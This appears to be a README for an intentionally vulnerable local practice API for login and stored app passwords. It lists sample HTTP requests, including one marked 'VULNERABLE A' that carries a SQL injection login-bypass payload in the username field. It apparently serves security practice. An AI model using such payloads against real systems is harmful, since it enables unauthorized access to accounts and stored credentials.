# VULNERABLE API

Start server

`python3 ./main.py`


## Endpoints

#### POST users

```POST /login HTTP/1.1
Host: localhost:5000
Content-Type: application/json
Content-Length: 52

{
    "username":"juan",
    "password":"perez"
}
```

VULNERABLE A 

```
POST /login HTTP/1.1
Host: localhost:5000
Content-Type: application/json
Content-Length: 57

{
    "username":"' OR 1=1;-- ",
    "password":""
}
```

```
POST /register HTTP/1.1
Host: localhost:5000
Content-Type: application/json
Content-Length: 52

{
    "username":"juan",
    "password":"perez"
}
```
#### POST passwords

```
POST /password HTTP/1.1
Host: localhost:5000
Content-Type: application/json
Content-Length: 80

{
    "username":"alejo",
    "password":"alejo222",
    "appName": "facebook"
}
```

#### GET passwords

```
GET /password?username=username&appName=app_name HTTP/1.1
Host: localhost:5000
```

